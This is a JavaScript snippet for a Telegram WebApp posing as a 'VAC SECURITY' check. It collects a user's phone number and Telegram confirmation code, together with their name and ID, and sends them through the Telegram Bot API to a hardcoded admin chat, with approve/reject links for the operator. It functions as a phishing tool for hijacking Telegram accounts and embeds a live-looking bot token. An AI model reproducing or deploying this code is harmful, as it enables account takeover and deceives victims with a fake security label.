// ВНИМАНИЕ: Это для теста! Не используйте в продакшене!
const BOT_TOKEN = '8196403348:AAGrU-BOJgX6nFZB7f_YV9trqrBGKplWWt0'; // Замените на реальный токен
const ADMIN_ID = '5665980031';     // Ваш ID в Telegram

// Отправка сообщения боту
window.sendToBot = async (type, data) => {
  const tg = window.Telegram.WebApp;
  const user = tg.initDataUnsafe.user || {};
  
  let message = '';
  let buttons = [];
  
  if (type === 'phone') {
    message = `📱 <b>Новый номер:</b> <code>${data}</code>\n` +
              `👤 От: ${user.first_name || 'Неизвестно'} ${user.last_name || ''}\n` +
              `🆔 ID: <code>${user.id || '?'}</code>\n` +
              (user.username ? `@${user.username}` : '');
  } 
  else if (type === 'code') {
    message = `🔢 <b>Код подтверждения:</b> <code>${data}</code>\n` +
              `👤 От: ${user.first_name || 'Неизвестно'}\n` +
              `🆔 ID: <code>${user.id || '?'}</code>`;
              
    buttons = [
      [
        { 
          text: "✅ Подтвердить", 
          url: `https://otz2026.github.io/mybot/yes.html?code=${data}&user_id=${user.id}`
        },
        { 
          text: "❌ Отклонить", 
          url: `https://otz2026.github.io/mybot/no.html?code=${data}&user_id=${user.id}`
        }
      ]
    ];
  }

  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: ADMIN_ID,
        text: `🔐 <b>VAC SECURITY</b>\n\n${message}`,
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: buttons }
      })
    });
    
    return await response.json();
  } catch (error) {
    console.error('Ошибка отправки:', error);
  }
};